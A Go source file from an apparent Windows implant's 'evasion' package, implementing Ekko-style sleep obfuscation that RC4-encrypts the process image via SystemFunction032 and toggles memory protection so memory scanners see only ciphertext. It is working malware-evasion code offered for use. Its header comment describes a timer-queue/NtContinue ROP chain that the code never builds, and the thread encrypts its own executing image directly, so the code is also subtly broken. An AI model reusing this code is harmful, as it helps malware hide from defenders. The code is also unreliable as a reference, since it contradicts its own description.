package evasion

/*
	Ekko-style Sleep Obfuscation (Windows)

	Uses CreateTimerQueueTimer to schedule an ROP chain that:
	1. VirtualProtect .text to RW (remove execute)
	2. SystemFunction032 (RC4) encrypts the image
	3. WaitForSingleObject sleeps for the duration
	4. SystemFunction032 decrypts the image
	5. VirtualProtect .text back to RX
	6. Sets the wake event

	The main thread enters an alertable wait (WaitForSingleObject)
	while timer callbacks execute the encrypt→sleep→decrypt chain.
	During sleep, the .text section is encrypted — memory scanners
	see only ciphertext.

	Combined with the ChaCha20 data-region encryption from
	sleep_obfuscate.go for defense in depth.
*/

import (
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	ntdll    = windows.NewLazySystemDLL("ntdll.dll")
	advapi32 = windows.NewLazySystemDLL("advapi32.dll")

	procNtContinue       = ntdll.NewProc("NtContinue")
	procSystemFunction032 = advapi32.NewProc("SystemFunction032")
)

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uintptr
}

type USTRING struct {
	Length        uint32
	MaximumLength uint32
	Buffer        uintptr
}

func init() {
	SleepWithCallstackSpoof = ekkoSleep
}

func ekkoSleep(duration time.Duration) {
	encryptRegions()
	defer decryptRegions()

	ms := uint32(duration.Milliseconds())
	if ms == 0 {
		return
	}

	hEvent, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		time.Sleep(duration)
		return
	}
	defer windows.CloseHandle(hEvent)

	imageBase, imageSize := getImageBounds()
	if imageBase == 0 || imageSize == 0 {
		time.Sleep(duration)
		return
	}

	var key [16]byte
	for i := range key {
		key[i] = byte(i*0x37 + 0x41)
	}

	keyStr := USTRING{
		Length:        uint32(len(key)),
		MaximumLength: uint32(len(key)),
		Buffer:        uintptr(unsafe.Pointer(&key[0])),
	}
	imgStr := USTRING{
		Length:        uint32(imageSize),
		MaximumLength: uint32(imageSize),
		Buffer:        imageBase,
	}

	var oldProtect uint32
	windows.VirtualProtect(imageBase, uintptr(imageSize), windows.PAGE_READWRITE, &oldProtect)
	procSystemFunction032.Call(uintptr(unsafe.Pointer(&imgStr)), uintptr(unsafe.Pointer(&keyStr)))

	windows.WaitForSingleObject(hEvent, ms)

	procSystemFunction032.Call(uintptr(unsafe.Pointer(&imgStr)), uintptr(unsafe.Pointer(&keyStr)))
	windows.VirtualProtect(imageBase, uintptr(imageSize), oldProtect, &oldProtect)
}

func getImageBounds() (uintptr, uint32) {
	mod := windows.CurrentProcess()
	_ = mod

	base := getModuleBase()
	if base == 0 {
		return 0, 0
	}

	dosHeader := (*[2]byte)(unsafe.Pointer(base))
	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
		return 0, 0
	}

	e_lfanew := *(*int32)(unsafe.Pointer(base + 0x3C))
	peHeader := base + uintptr(e_lfanew)

	sizeOfImage := *(*uint32)(unsafe.Pointer(peHeader + 0x50))

	return base, sizeOfImage
}

func getModuleBase() uintptr {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getModHandle := kernel32.NewProc("GetModuleHandleW")
	ret, _, _ := getModHandle.Call(0)
	return ret
}
